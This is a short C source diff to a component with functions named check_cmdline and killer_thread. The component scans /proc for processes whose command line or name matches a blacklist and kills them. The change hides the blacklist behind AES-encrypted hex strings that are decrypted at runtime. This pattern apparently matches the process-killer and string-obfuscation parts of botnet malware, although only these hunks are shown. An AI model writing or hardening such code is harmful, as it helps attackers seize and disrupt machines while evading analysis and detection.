@@ -283,10 +283,10 @@ static inline int check_for_malware(const char *pid_str) {
 
 static inline int check_cmdline(const char *pid_str) {
     char path[PATH_LEN];
-    char buf[PATH_LEN] = {0};  
+    char buf[PATH_LEN] = {0};
     int fd;
-    
-    if (snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str) >= sizeof(path)) {
+
+    if (snprintf(path, sizeof(path), "/proc/%s/cmdline", pid_str) >= (int)sizeof(path)) {
         return 0;
     }
     fd = open(path, O_RDONLY);
@@ -296,9 +296,12 @@ static inline int check_cmdline(const char *pid_str) {
         if (n > 0) {
             buf[n] = '\0';
             for (int i = 0; blacklisted[i] != NULL; i++) {
-                if (strstr(buf, blacklisted[i])) {
+                char *tmp = aes_decrypt_hex_string(AES_KEY, blacklisted[i]);
+                if (tmp && strstr(buf, tmp)) {
+                    free(tmp);
                     return 1;
                 }
+                free(tmp);
             }
         }
     }
@@ -557,13 +560,16 @@ static void* killer_thread(void* arg) {
                     comm_content[n] = '\0';
                     char* newline = strchr(comm_content, '\n');
                     if (newline) *newline = '\0';
-                    
+
                     for (int i = 0; blacklisted[i] != NULL; i++) {
-                        if (strstr(comm_content, blacklisted[i])) {
+                        char *tmp = aes_decrypt_hex_string(AES_KEY, blacklisted[i]);
+                        if (tmp && strstr(comm_content, tmp)) {
+                            free(tmp);
                             kill_process(pid);
                             usleep(1000);
                             break;
                         }
+                        free(tmp);
                     }
                 }
             }
